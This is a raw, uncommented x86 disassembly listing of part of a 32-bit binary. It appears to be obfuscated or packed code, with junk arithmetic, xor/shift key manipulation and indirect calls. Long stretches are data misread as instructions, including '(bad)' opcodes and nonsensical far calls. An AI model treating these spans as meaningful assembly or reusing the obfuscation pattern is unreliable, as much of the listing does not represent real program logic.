  4137b3:	xor    ecx,DWORD PTR ds:0x4283e1
  4137b9:	mov    DWORD PTR ds:0x428515,ecx
  4137bf:	inc    ecx
  4137c0:	movzx  ecx,BYTE PTR ds:0x428315
  4137c7:	sub    ecx,DWORD PTR ds:0x428481
  4137cd:	mov    DWORD PTR ds:0x428315,ecx
  4137d3:	cmp    DWORD PTR ds:0x4283fd,0x0
  4137da:	not    ecx
  4137dc:	mov    DWORD PTR ds:0x4283bd,0x5561
  4137e6:	jmp    0x41383a
  4137eb:	mov    DWORD PTR ds:0x428531,0x2772
  4137f5:	cmp    DWORD PTR ds:0x4283fd,0x0
  4137fc:	jle    0x41381e
  413802:	push   0x5196
  413807:	push   0x4281bf
  41380c:	call   DWORD PTR ds:0x42e260
  413812:	sbb    DWORD PTR ds:0x428319,ecx
  413818:	xor    ecx,DWORD PTR ds:0x42852d
  41381e:	and    DWORD PTR ds:0x4283ed,edi
  413824:	inc    DWORD PTR ds:0x428401
  41382a:	add    DWORD PTR ds:0x428309,0x3293
  413834:	or     DWORD PTR ds:0x4283d5,ecx
  41383a:	mov    DWORD PTR [ebp-0x24],eax
  41383d:	mov    ecx,DWORD PTR [ebp-0x24]
  413840:	push   0x4
  413842:	sub    DWORD PTR ds:0x42848d,0x4aeb
  41384c:	pop    eax
  41384d:	sbb    DWORD PTR ds:0x42850d,0x428309
  413857:	sub    eax,ecx
  413859:	cmp    DWORD PTR ds:0x428321,0x0
  413860:	mov    ecx,DWORD PTR ds:0x4284a1
  413866:	not    ecx
  413868:	movzx  ecx,BYTE PTR ds:0x4282f9
  41386f:	mov    ecx,DWORD PTR ds:0x428415
  413875:	jmp    0x4138c3
  41387a:	mov    DWORD PTR ds:0x428491,0x61cd
  413884:	cmp    DWORD PTR ds:0x428321,0x0
  41388b:	je     0x4138b5
  413891:	push   0x428495
  413896:	push   0x42828f
  41389b:	call   DWORD PTR ds:0x42e264
  4138a1:	or     DWORD PTR ds:0x428411,0x4283d5
  4138ab:	mov    DWORD PTR ds:0x4283d1,0x2055
  4138b5:	sub    ecx,DWORD PTR ds:0x42840d
  4138bb:	or     ecx,DWORD PTR ds:0x4283bd
  4138c1:	neg    ecx
  4138c3:	mov    ecx,DWORD PTR [ebp-0x20]
  4138c6:	add    ecx,eax
  4138c8:	mov    DWORD PTR [ebp-0x30],ecx
  4138cb:	lea    eax,[ebp-0x3c]
  4138ce:	mov    DWORD PTR [ebp-0x38],eax
  4138d1:	mov    eax,DWORD PTR [ebp-0x18]
  4138d4:	mov    ecx,DWORD PTR [ebp-0x18]
  4138d7:	xor    eax,edi
  4138d9:	xor    ecx,ebx
  4138db:	shr    eax,0x2
  4138de:	shl    ecx,0x1e
  4138e1:	or     eax,ecx
  4138e3:	mov    DWORD PTR [ebp-0x2c],eax
  4138e6:	mov    DWORD PTR [ebp-0x8],0xa5069bbe
  4138ed:	mov    eax,DWORD PTR [ebp-0x8]
  4138f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4138f3:	xor    eax,edi
  4138f5:	xor    ecx,ebx
  4138f7:	shr    eax,0x2
  4138fa:	shl    ecx,0x1e
  4138fd:	or     ecx,eax
  4138ff:	push   ecx
  413900:	lea    eax,[ebp-0x8]
  413903:	push   eax
  413904:	lea    eax,[ebp-0x80]
  413907:	push   eax
  413908:	call   0x411c08
  41390d:	mov    eax,DWORD PTR [ebp-0x8]
  413910:	mov    ecx,DWORD PTR [ebp-0x8]
  413913:	xor    eax,edi
  413915:	xor    ecx,ebx
  413917:	shr    eax,0x2
  41391a:	shl    ecx,0x1e
  41391d:	or     ecx,eax
  41391f:	push   ecx
  413920:	lea    eax,[ebp-0x24]
  413923:	push   eax
  413924:	mov    eax,DWORD PTR [ebp+0x8]
  413927:	mov    ecx,DWORD PTR [ebp+0xc]
  41392a:	shrd   eax,ecx,0x2
  41392e:	shr    ecx,0x2
  413931:	mov    ecx,DWORD PTR [ebp+0x8]
  413934:	mov    edx,DWORD PTR [ebp+0xc]
  413937:	xor    eax,esi
  413939:	xor    edx,edx
  41393b:	or     eax,edx
  41393d:	lea    eax,[ebp+eax*4-0x7c]
  413941:	push   eax
  413942:	shl    ecx,0x1e
  413945:	call   0x411c08
  41394a:	mov    eax,DWORD PTR [ebp-0x8]
  41394d:	mov    ecx,DWORD PTR [ebp-0x8]
  413950:	xor    eax,edi
  413952:	xor    ecx,ebx
  413954:	shr    eax,0x2
  413957:	shl    ecx,0x1e
  41395a:	or     ecx,eax
  41395c:	push   ecx
  41395d:	lea    eax,[ebp-0x30]
  413960:	push   eax
  413961:	jmp    0x413c9a
  413966:	in     eax,dx
  413967:	dec    edi
  413968:	ret    
  413969:	in     al,dx
  41396a:	fs jl  0x413963
  41396d:	pop    ebx
  41396e:	push   0x45e3e744
  413973:	or     esi,edx
  413975:	iret   
  413976:	in     al,dx
  413977:	xchg   BYTE PTR [esi-0x413b1242],bh
  41397d:	mov    esi,0xc399c236
  413982:	test   eax,esp
  413984:	je     0x4139a8
  413986:	jns    0x41397a
  413988:	jb     0x4139e1
  41398a:	out    dx,eax
  41398b:	mov    ?,WORD PTR [esi+edx*2-0x63]
  41398f:	xchg   ebx,eax
  413990:	addr16 xor ah,dl
  413993:	jne    0x4139cd
  413995:	mov    ah,0x1c
  413997:	push   0x21
  413999:	inc    eax
  41399a:	mov    ch,0x5e
  41399c:	aas    
  41399d:	pop    esi
  41399e:	or     esi,0x693d4d32
  4139a4:	mov    ds:0x384cc4e0,eax
  4139a9:	sbb    esp,DWORD PTR [ebp+0x606050b8]
  4139af:	lods   eax,DWORD PTR ds:[esi]
  4139b0:	retf   
  4139b1:	not    BYTE PTR ds:[eax+edx*1+0x473a5fef]
  4139b9:	and    eax,0xd15e352f
  4139be:	push   cs
  4139bf:	pop    ecx
  4139c0:	cmp    ah,ah
  4139c2:	pop    esi
  4139c3:	imul   edi,DWORD PTR [ebx-0xe],0xe5d62fc2
  4139ca:	jecxz  0x4139f6
  4139cc:	jne    0x413996
  4139ce:	arpl   WORD PTR [esi+0x78],si
  4139d1:	add    cl,dl
  4139d3:	retf   0xb7fe
  4139d6:	push   ecx
  4139d7:	inc    ecx
  4139d8:	xchg   edi,eax
  4139d9:	lods   al,BYTE PTR ds:[esi]
  4139da:	or     edi,DWORD PTR [ebx-0x6e]
  4139dd:	test   eax,0x11f9eeca
  4139e2:	stos   DWORD PTR es:[edi],eax
  4139e3:	mov    dh,0xc2
  4139e5:	or     ebp,DWORD PTR [edx]
  4139e7:	imul   edi,edi,0x3f
  4139ea:	add    BYTE PTR [ecx+0x23],cl
  4139ed:	sub    dl,BYTE PTR [edx]
  4139ef:	sbb    bl,BYTE PTR ss:[edx-0x6cc0baf3]
  4139f6:	ins    DWORD PTR es:[edi],dx
  4139f7:	jmp    0x41398b
  4139f9:	sub    cl,ch
  4139fb:	(bad)  
  4139fc:	jne    0x4139d5
  4139fe:	push   ss
  4139ff:	stc    
  413a00:	jge    0x41398f
  413a02:	xchg   esi,eax
  413a03:	mov    ds:0x6d3250b,eax
  413a08:	mov    ch,0x4b
  413a0b:	jmp    0x413a73
  413a0d:	xor    BYTE PTR [ecx-0x8],dl
  413a10:	ds dec ebp
  413a12:	xchg   DWORD PTR [ebp+0x65],ecx
  413a15:	in     eax,dx
  413a16:	xor    eax,0x463a3a82
  413a1b:	iret   
  413a1c:	xor    BYTE PTR [bx+si-0x264f],bl
  413a21:	dec    edi
  413a22:	cmp    eax,0x1e7e0ddb
  413a27:	lods   al,BYTE PTR ds:[esi]
  413a28:	call   0xd837:0x508cbca5
  413a2f:	adc    ch,dh
  413a31:	pop    esp
  413a32:	stc    
  413a33:	mov    ah,0x53
  413a35:	inc    ecx
  413a36:	cmp    eax,0x6622718a
  413a3b:	cmp    eax,0x5aeb53c2
  413a40:	call   0x6b05:0xd1e9d612
  413a47:	imul   esi,esp,0x647487ec
  413a4d:	sar    DWORD PTR [esi+0x364960a5],1
  413a53:	out    0xb2,eax
  413a55:	lock mov ch,0x87
  413a58:	ins    BYTE PTR es:[edi],dx
  413a59:	aaa    
  413a5a:	fbld   TBYTE PTR [esi+0x1a9d6477]
  413a60:	sbb    edx,DWORD PTR [esp+edx*8]
  413a63:	push   ebp
  413a64:	gs addr16 cmp eax,0x61a7747b
  413a6b:	mov    al,ds:0x2fe599a3
  413a70:	mov    eax,0xc9a5fa85
  413a75:	rcr    BYTE PTR [esi],cl
  413a77:	in     al,0x50
  413a79:	inc    esp
  413a7a:	cld    
  413a7b:	mov    WORD PTR [edx+0xc],?
  413a7e:	cmp    edx,DWORD PTR [edx+0x48]
  413a81:	xor    al,0x78
  413a83:	stc    
  413a84:	pop    eax
  413a85:	cmp    bl,BYTE PTR [ebp-0x3e1bad9]
  413a8b:	fbstp  TBYTE PTR [ecx+0x19b75472]
  413a91:	jmp    0x52db:0x9ae8fe2e
  413a98:	test   BYTE PTR [esi+0x7f],dl
  413a9b:	fcomp  DWORD PTR [ebp-0x5cab39b4]
  413aa1:	retf   
  413aa2:	popf   
  413aa3:	call   0x861f:0xddae413c
  413aaa:	cmp    DWORD PTR [edx],edx
  413aac:	adc    al,BYTE PTR [edx]
  413aae:	mov    BYTE PTR [ebx+0x41acc5b7],dl
  413ab4:	je     0x413b2e
  413ab6:	pop    ebx
  413ab7:	mov    ds:0x6cfba8c4,al
  413abc:	lea    eax,[ecx]
  413abe:	mov    ebx,0xb9443f5f
  413ac3:	nop
  413ac4:	xor    eax,0x2f30c055
  413ac9:	outs   dx,DWORD PTR ds:[esi]
  413aca:	xchg   al,bh
  413acc:	test   DWORD PTR [esi-0x69],edx
  413acf:	in     eax,0xb6
  413ad1:	(bad)  
  413ad2:	xchg   ecx,eax
  413ad3:	mov    ss,WORD PTR [eax-0x1e]
  413ad6:	dec    edi
  413ad7:	adc    BYTE PTR [edx+0x54fa0eba],ch
  413add:	into   
  413ade:	lock pushf 
  413ae0:	(bad)  
  413ae1:	mov    ebx,0x41de0914
  413ae6:	push   es
  413ae7:	ins    BYTE PTR es:[edi],dx
  413ae8:	jl     0x413aa6
  413aea:	adc    al,0xbe
  413aec:	adc    esp,DWORD PTR [edx]
  413aee:	fcmovb st,st(0)
  413af0:	pop    ds
  413af1:	and    al,0x3c
  413af3:	xchg   ebx,eax
  413af4:	xor    ebx,ebp
  413af6:	das    
  413af7:	popf   
  413af8:	mov    cl,0x5d
  413afa:	rcl    dh,0x63
  413afd:	lock cmp edx,DWORD PTR [ebp+0x9fc951d]
  413b04:	pushf  
  413b05:	retf   
  413b06:	ja     0x413b1e
  413b08:	ins    DWORD PTR es:[edi],dx
  413b09:	jle    0x413b39
  413b0b:	stos   DWORD PTR es:[edi],eax
  413b0c:	xor    al,0x49
  413b0e:	or     bl,ah
  413b10:	(bad)  
  413b12:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  413b14:	sbb    ebx,esp
  413b16:	scas   al,BYTE PTR es:[edi]
  413b17:	xlat   BYTE PTR ds:[ebx]
  413b18:	jecxz  0x413a9c
  413b1a:	inc    esp
  413b1b:	lea    edi,[esi]
  413b1d:	xchg   eax,ebx
  413b1f:	arpl   ax,bp
  413b21:	shl    ah,1
  413b23:	xchg   bh,ah
  413b25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b26:	fldcw  WORD PTR [esi+0x725a082d]
  413b2c:	push   cs
  413b2d:	rcr    BYTE PTR [ebx],cl
  413b2f:	bound  eax,QWORD PTR ds:0xd246b3fd
  413b35:	stos   BYTE PTR es:[edi],al
  413b36:	xchg   ecx,eax
  413b37:	jns    0x413ac4
  413b39:	(bad)  
  413b3a:	je     0x413ac8
  413b3c:	(bad)  
  413b3d:	xchg   esp,eax
  413b3e:	mov    es,WORD PTR [esi+eax*1]
  413b41:	aam    0x50
  413b43:	stos   BYTE PTR es:[edi],al
  413b44:	jecxz  0x413ad3
  413b46:	ins    DWORD PTR es:[edi],dx
  413b47:	xchg   ebx,eax
  413b48:	jnp    0x413b6a
  413b4a:	jmp    0x2419:0x64d3d69c
  413b51:	push   esp
  413b52:	cmp    edx,DWORD PTR [edi]
  413b54:	push   cs
  413b55:	pop    ebp
  413b56:	mov    esi,0x528b0c9
  413b5b:	mov    bh,0x55
  413b5d:	pop    edi
  413b5e:	add    al,0xa8
  413b60:	ja     0x413bbc
  413b62:	lea    esp,[ebx+0x4ba72389]
  413b68:	pop    edi
  413b69:	jno    0x413b7a
  413b6b:	jo     0x413afe
  413b6d:	les    edi,FWORD PTR [ecx-0x27e5db64]
  413b73:	shr    BYTE PTR [ecx],0xff
  413b76:	sbb    eax,0x9bfbfd14
  413b7b:	jnp    0x413b3f
  413b7d:	addr16 sahf 
  413b7f:	bound  esi,QWORD PTR [eax-0x2df266b4]
  413b85:	jbe    0x413b29
  413b87:	and    ebx,DWORD PTR [ebx+0x5932e821]
  413b8d:	dec    ebx
  413b8e:	aas    
  413b8f:	mov    edx,0x55ce96c7
  413b94:	js     0x413b44
  413b96:	sbb    al,cl
  413b98:	jns    0x413bf1
  413b9a:	sbb    DWORD PTR [edi+0x1d],esi
  413b9d:	sbb    DWORD PTR [ebx],esi
  413b9f:	cmp    al,0xda
  413ba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ba2:	xor    bl,BYTE PTR [esi-0x61]
  413ba5:	sar    BYTE PTR [edx],0x8a
  413ba8:	jo     0x413b7a
  413baa:	sbb    DWORD PTR [edx-0x22],ecx
  413bad:	ret    
  413bae:	or     DWORD PTR [esi+0x5a],ebp
  413bb1:	add    ebp,edx
  413bb3:	mov    ebx,0xaf6d942f
  413bb8:	test   eax,0xbfcc8326
  413bbd:	mov    ah,0xe7
  413bbf:	cmp    ebp,DWORD PTR ds:0x6361a545
  413bc5:	cmc    
  413bc6:	adc    eax,0xf465a518
  413bcb:	or     edx,edi
  413bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bce:	fdiv   QWORD PTR [ecx]
  413bd0:	push   esi
  413bd1:	pop    es
  413bd2:	and    al,0x4f
  413bd4:	sbb    eax,0x938bfe3b
  413bd9:	mov    ch,0x6a
  413bdb:	mov    dl,0x7f
  413bdd:	in     al,dx
  413bde:	push   0x3a
  413be0:	(bad)
  413be3:	pop    edx
  413be4:	cmp    ah,BYTE PTR [esi]
  413be6:	stos   DWORD PTR es:[edi],eax
  413be7:	jg     0x413c14
  413be9:	or     al,BYTE PTR [edi-0x51]
  413bec:	cmp    al,dh
  413bee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bef:	xchg   ecx,eax
  413bf0:	repnz retf 0x1d82
  413bf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bf5:	or     al,BYTE PTR gs:[eax+0x7a1f42f6]
  413bfc:	mov    edi,0x36fba9c4
  413c01:	or     eax,0x8b7aeb73
  413c06:	jb     0x413bea
  413c08:	out    dx,al
  413c09:	mov    edx,0x388d8893
  413c0e:	(bad)  
  413c0f:	jl     0x413c5e
  413c11:	(bad)  
  413c12:	fmul   st,st(7)
  413c14:	arpl   WORD PTR [esi+0x20],si
  413c17:	mov    edx,0x7ec631bb
  413c1c:	ret    
  413c1d:	popa   
  413c1e:	adc    al,0x4b
  413c20:	pop    edi
  413c21:	mov    bh,0xa6
  413c23:	(bad)  
  413c24:	lea    ecx,[edx-0x25813ed0]
  413c2a:	cmp    dl,BYTE PTR [ebx]
  413c2c:	mov    ah,0x2b
  413c2e:	cmp    bh,BYTE PTR [ecx+0x538f876c]
  413c34:	addr16 mov cl,0xa1
  413c37:	retf   0x315d
  413c3a:	sbb    DWORD PTR [ebx+edx*8],edx
  413c3d:	popa   
  413c3e:	xchg   DWORD PTR [edi],eax
  413c40:	mov    eax,0x648bc3cf
  413c45:	pop    esi
  413c46:	sbb    al,0x3d
  413c48:	stos   BYTE PTR es:[edi],al
  413c49:	cmp    bh,dh
  413c4b:	out    0xe3,eax
  413c4d:	jns    0x413c3f
  413c4f:	sbb    ah,dh
  413c51:	loopne 0x413c41
  413c53:	mov    cl,0xc1
  413c55:	sbb    eax,DWORD PTR cs:[esi-0x6e54d120]
  413c5c:	out    dx,al
  413c5d:	pushf  
  413c5e:	pop    ebp
  413c5f:	mov    ds:0x693e048d,al
  413c64:	mov    BYTE PTR [eax-0x76],bl
  413c67:	mov    esp,0x32035d20
  413c6c:	push   edx
  413c6d:	and    DWORD PTR [ebx+0x11],edi
  413c70:	cmp    ah,BYTE PTR [edx+0x2592200]
  413c76:	lds    esp,FWORD PTR [ecx+0x5f]
  413c79:	fwait
  413c7a:	xor    ebx,ecx
  413c7c:	sbb    edi,DWORD PTR [eax-0x51]
  413c7f:	gs mov ecx,0x433aa550
  413c85:	mov    ds:0x54e85bd8,eax
  413c8a:	ror    BYTE PTR [ebx+0x9bfab34],cl
  413c90:	data16 mov dh,0xc4
  413c93:	pop    es
  413c94:	inc    eax
  413c95:	jl     0x413c98
  413c97:	cmp    bl,cl
  413c99:	lea    ecx,[ebx+0x4d8b1045]
  413c9f:	adc    al,0xf
  413ca1:	lods   al,BYTE PTR ds:[esi]
  413ca2:	enter  0xc102,0xe9
  413ca6:	add    cl,BYTE PTR [ebx+0x558b104d]
  413cac:	adc    al,0x33
  413cae:	(bad)  
  413caf:	xor    edx,edx
  413cb1:	or     eax,edx
  413cb3:	lea    eax,[ebp+eax*4-0x7c]
  413cb7:	push   eax
  413cb8:	shl    ecx,0x1e
  413cbb:	call   0x411c08
  413cc0:	mov    eax,DWORD PTR [ebp-0x8]
  413cc3:	mov    ecx,DWORD PTR [ebp-0x8]
  413cc6:	xor    ecx,ebx
  413cc8:	xor    eax,edi
  413cca:	shl    ecx,0x1e
  413ccd:	shr    eax,0x2
  413cd0:	or     ecx,eax
  413cd2:	push   ecx
  413cd3:	lea    eax,[ebp-0x2c]
  413cd6:	push   eax
  413cd7:	mov    eax,DWORD PTR [ebp+0x10]
  413cda:	mov    ecx,DWORD PTR [ebp+0x14]
  413cdd:	shrd   eax,ecx,0x2
  413ce1:	shr    ecx,0x2
  413ce4:	mov    ecx,DWORD PTR [ebp+0x10]
  413ce7:	mov    edx,DWORD PTR [ebp+0x14]
  413cea:	xor    edx,edx
  413cec:	xor    eax,esi
  413cee:	or     eax,edx
  413cf0:	shl    ecx,0x1e
  413cf3:	mov    ecx,DWORD PTR [ebp+0x10]
  413cf6:	mov    edx,DWORD PTR [ebp+0x14]
  413cf9:	shrd   ecx,edx,0x2
  413cfd:	shr    edx,0x2
  413d00:	mov    edx,DWORD PTR [ebp+0x10]
  413d03:	mov    ebx,DWORD PTR [ebp+0x14]
  413d06:	xor    ecx,esi
  413d08:	xor    ebx,ebx
  413d0a:	or     ecx,ebx
  413d0c:	add    eax,ecx
  413d0e:	lea    eax,[ebp+eax*4-0x7c]
  413d12:	push   eax
  413d13:	shl    edx,0x1e
  413d16:	call   0x411c08
  413d1b:	mov    eax,DWORD PTR [ebp-0x8]
  413d1e:	mov    ecx,DWORD PTR [ebp-0x8]
  413d21:	xor    ecx,0xfffffffe
  413d24:	shl    ecx,0x1e
  413d27:	xor    eax,edi
  413d29:	shr    eax,0x2
  413d2c:	or     ecx,eax
  413d2e:	push   ecx
  413d2f:	lea    eax,[ebp-0x38]
  413d32:	push   eax
  413d33:	mov    eax,DWORD PTR [ebp+0x10]
  413d36:	mov    ecx,DWORD PTR [ebp+0x14]
  413d39:	shrd   eax,ecx,0x2
  413d3d:	shr    ecx,0x2
  413d40:	jmp    0x414079
  413d45:	lock aad 0x95
  413d48:	dec    ecx
  413d49:	mov    bh,0x8a
  413d4b:	xor    al,0x7c
  413d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d4e:	cmp    eax,0xfbddd72
  413d53:	loope  0x413ce5
  413d55:	sbb    ecx,DWORD PTR [esi+edi*4-0x413b1242]
  413d5c:	mov    esi,0xc4592f18
  413d61:	sub    edi,esi
  413d63:	and    edi,esp
  413d65:	xchg   ebx,eax
  413d66:	pop    es
  413d67:	js     0x413d48
  413d69:	mov    ch,0xbb
  413d6b:	mov    edx,0x39a370cb
  413d70:	(bad)  
  413d71:	repz int3 
  413d73:	pop    esp
  413d74:	xchg   esi,eax
  413d75:	ja     0x413d12
  413d77:	xchg   ecx,eax
  413d78:	mov    WORD PTR [ebx+0x65],es
  413d7b:	or     eax,0x2bd73c37
  413d80:	rol    BYTE PTR [edx+0x49],1
  413d83:	sub    dh,BYTE PTR fs:[esp+eiz*8]
  413d87:	add    DWORD PTR ds:0x1c0c4d98,ebx
  413d8d:	sbb    edi,DWORD PTR [edx-0x1bb1fdfe]
  413d93:	scas   al,BYTE PTR es:[edi]
  413d94:	dec    ebp
  413d95:	xor    ecx,DWORD PTR [ecx+0x26]
  413d98:	mov    eax,ds:0x80a5a3ae
  413d9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d9e:	push   esi
  413d9f:	ret    
  413da0:	jp     0x413df3
  413da2:	test   BYTE PTR [eax],dl
  413da4:	aas    
  413da5:	dec    edx
  413da6:	sub    eax,0x794e6787
  413dab:	adc    eax,0x5c4b7f9d
  413db0:	ins    BYTE PTR es:[edi],dx
  413db1:	adc    edx,DWORD PTR [ebp-0x58bdd7c]
  413db7:	into   
  413db8:	mov    cl,0xf9
  413dba:	fwait
  413dbb:	cwde   
  413dbc:	lock jae 0x413d56
  413dbf:	pushf  
  413dc0:	cs sahf 
  413dc2:	sbb    cl,BYTE PTR [ebp+0x6f]
  413dc5:	inc    eax
  413dc6:	adc    al,0x71
  413dc8:	jnp    0x413d6a
  413dca:	mov    bl,0x59
  413dcc:	xor    al,0x71
  413dce:	lods   eax,DWORD PTR ds:[esi]
  413dcf:	jb     0x413e32
  413dd1:	sti    
  413dd2:	sub    dh,0x8b
  413dd5:	out    dx,eax
  413dd6:	sub    ch,BYTE PTR [eax-0x48]
  413dd9:	test   DWORD PTR [esi+0x76],ebp
  413ddc:	jns    0x413d9b
  413dde:	std    
  413ddf:	lods   eax,DWORD PTR ds:[esi]
  413de0:	sub    ebx,DWORD PTR [bx+si]
  413de3:	mov    esp,0xa9c53a55
  413de8:	icebp  
  413de9:	mov    eax,ds:0x46e689be
  413dee:	loopne 0x413d9c
  413df0:	stc    
  413df1:	ins    BYTE PTR es:[edi],dx
  413df2:	push   ebx
  413df3:	push   0x7f
  413df5:	icebp  
  413df6:	sub    BYTE PTR [edx+0x37],ch
  413df9:	xor    edx,edi
  413dfb:	loop   0x413df1
  413dfd:	cli    
  413dfe:	xor    eax,0x2d42d144
  413e03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e04:	or     dl,cl
  413e06:	xchg   BYTE PTR [edi+0x2f],al
  413e09:	dec    ebx
  413e0a:	in     al,0x27
  413e0c:	push   eax
  413e0d:	mov    es,WORD PTR [edx-0x2a]
  413e10:	int    0xa0
  413e12:	por    mm4,QWORD PTR ds:0x3b63cc6e
  413e19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e1b:	and    ebx,DWORD PTR [ebp-0x16]
  413e1e:	inc    edx
  413e1f:	int    0x8e
  413e21:	xor    ah,BYTE PTR [ecx+0x2b]
  413e24:	std    
  413e25:	or     DWORD PTR [esi+ecx*1-0x94f3596],edx
  413e2c:	in     eax,0xc9
  413e2e:	test   BYTE PTR [esi+0x5c27511b],dl
  413e34:	jg     0x413e27
  413e36:	jle    0x413e18
  413e38:	push   ss
  413e39:	add    al,0x3e
  413e3b:	(bad)  
  413e3d:	ins    DWORD PTR es:[edi],dx
  413e3e:	xor    al,0x2e
  413e40:	mov    eax,0xb854ed97
  413e45:	xor    esi,0xffffffc6
  413e48:	push   0x2a
  413e4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e4b:	inc    eax
  413e4c:	or     al,ch
  413e4e:	or     eax,0xfd580ff6
  413e53:	push   ss
  413e54:	add    eax,0x63a4cd33
  413e59:	mov    bh,0x4a
  413e5b:	es pop ecx
  413e5d:	or     ebp,DWORD PTR [ecx]
  413e5f:	rcl    BYTE PTR [esp+edi*2+0x57],1
  413e63:	iret   
  413e64:	or     eax,0x3ad59080
  413e69:	cmp    dh,bl
  413e6b:	out    dx,al
  413e6c:	lds    eax,FWORD PTR [edi+ecx*4-0x7a79b4a9]
  413e73:	jo     0x413e4d
  413e75:	daa    
  413e76:	addr16 jg 0x413ee1
  413e79:	push   edi
  413e7a:	int    0x4
  413e7c:	push   ds
  413e7d:	xor    dh,BYTE PTR [edi+0x2c]
  413e80:	movaps XMMWORD PTR [eax+0x2d],xmm0
  413e84:	xor    BYTE PTR [eax+0x36],0xce
  413e88:	in     eax,dx
  413e89:	out    0xfd,al
  413e8b:	xlat   BYTE PTR ds:[ebx]
  413e8c:	clc    
  413e8d:	or     ebx,DWORD PTR [edx+0x7bf05953]
  413e93:	inc    edi
  413e94:	adc    ebx,edx
  413e96:	mov    cl,0x8f
  413e98:	cld    
  413e99:	jl     0x413f02
  413e9b:	daa    
  413e9c:	jb     0x413edd
  413e9e:	cs test al,0x8
  413ea1:	and    bl,0x85
  413ea4:	mov    ah,0xef
  413ea6:	push   cs
  413ea7:	xchg   esi,eax
  413ea8:	inc    eax
  413ea9:	loope  0x413f15
  413eab:	xor    eax,0x19f2c559
  413eb0:	fsubr  st(0),st
  413eb2:	jne    0x413f15
  413eb4:	adc    DWORD PTR [ebx],esi
  413eb6:	lahf   
  413eb7:	mov    dh,0xd8
  413eb9:	lds    esi,FWORD PTR [edi+0x12]
  413ebc:	cli    
  413ebd:	popa   
  413ebe:	mov    ch,0x62
  413ec0:	out    dx,eax
  413ec1:	pop    eax
  413ec2:	mov    ebx,0x773bb570
  413ec7:	(bad)  
  413ec8:	retf   
  413ec9:	xchg   ebp,eax
  413eca:	push   ebx
  413ecb:	cmp    BYTE PTR [esi+0x63ddb0a3],bh
  413ed1:	inc    esp
  413ed2:	inc    eax
  413ed3:	inc    ebp
  413ed4:	pop    eax
  413ed5:	or     ebx,DWORD PTR [eax]
  413ed7:	fistp  WORD PTR [eax]
  413ed9:	or     ax,0x8039
  413edd:	sbb    ax,0xe1bb
  413ee1:	rol    BYTE PTR [ecx],cl
  413ee3:	cwde   
  413ee4:	pop    eax
  413ee5:	mov    BYTE PTR ds:0xd0812bbd,ch
  413eeb:	aam    0x89
  413eed:	mov    bl,0x5
  413eef:	add    DWORD PTR [edx+0x2b],0xf94912a7
  413ef6:	mov    ebx,0x96cec3ee
  413efb:	dec    ebx
  413efc:	lock push 0x2f
  413eff:	(bad)  
  413f00:	aam    0xae
  413f02:	jo     0x413f79
  413f04:	or     eax,0xe7310fe4
  413f09:	imul   BYTE PTR [ebp-0x61]
  413f0c:	out    dx,eax
  413f0d:	leave  
  413f0e:	pop    ss
  413f0f:	xchg   esi,eax
  413f10:	popf   
  413f11:	fdivr  QWORD PTR [edx+0x6a]
  413f14:	nop
  413f15:	das    
  413f16:	mov    cl,0xf4
  413f18:	cmp    cl,al
  413f1a:	push   ecx
  413f1b:	push   edx
  413f1c:	pop    ebp
  413f1d:	inc    esi
  413f1e:	lahf   
  413f1f:	js     0x413f0b
  413f21:	pusha  
  413f22:	add    al,0x31
  413f24:	pop    ebp
  413f25:	lea    eax,[edx+edi*4+0x29]
  413f29:	mov    edi,0x6640db9c
  413f2e:	cmp    edx,0x24
  413f31:	push   ecx
  413f32:	sbb    ebx,DWORD PTR [ebx]
  413f34:	rol    DWORD PTR [edx-0x27],cl
  413f37:	push   0xffffff86
  413f39:	add    edx,DWORD PTR ds:0xad08270c
  413f3f:	xor    BYTE PTR [edi],bh
  413f41:	std    
  413f42:	ja     0x413f9d
  413f44:	pop    DWORD PTR [ecx-0x2fff11e8]
  413f4a:	test   al,0x1c
  413f4c:	jae    0x413fcc
  413f4e:	dec    esp
  413f4f:	add    eax,0x9cedd7b5
  413f54:	stos   BYTE PTR es:[edi],al
  413f55:	jg     0x413ee2
  413f57:	mov    esp,0xdca1b1f5
  413f5c:	and    ecx,DWORD PTR [ebp+0x33]
  413f5f:	sub    edx,ecx
  413f61:	mov    ah,bl
  413f63:	jmp    0xf70c:0xd6b25201
  413f6a:	shl    BYTE PTR [ebp+ecx*1+0xf],1
  413f6e:	mov    esi,0x14dc7729
  413f73:	scas   eax,DWORD PTR es:[edi]
  413f74:	scas   eax,DWORD PTR es:[edi]
  413f75:	cs stos BYTE PTR es:[edi],al
  413f77:	dec    esi
  413f78:	stos   BYTE PTR es:[edi],al
  413f79:	pop    eax
  413f7a:	xchg   esi,eax
  413f7b:	sbb    eax,0xec9a590d
  413f80:	cdq    
  413f81:	iret   
  413f82:	popa   
  413f83:	dec    esi
  413f84:	lock xlat BYTE PTR ds:[ebx]
  413f86:	ja     0x413f7b
  413f88:	xchg   edx,eax
  413f89:	inc    ebp
  413f8a:	nop
  413f8b:	ja     0x413f92
  413f8d:	in     eax,dx
  413f8e:	jo     0x413fd2
  413f90:	inc    BYTE PTR [eax+edx*1-0xc]
  413f94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f95:	mov    edi,0xe4960559
  413f9a:	adc    dl,dh
  413f9c:	lea    ebx,[edx+0x55be73c8]
  413fa2:	dec    eax
  413fa3:	cld    
  413fa4:	cmp    DWORD PTR [edi+0x658dc043],0x26
  413fab:	push   ecx
  413fac:	cs jae 0x413fdb
  413faf:	mov    ds:0x80e24d14,al
  413fb4:	inc    edi
  413fb5:	or     DWORD PTR [ecx],eax
  413fb7:	sbb    cl,BYTE PTR [ebx+ebp*2-0x76]
  413fbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fbc:	push   ds
  413fbd:	cmp    dl,cl
  413fbf:	xchg   edi,eax
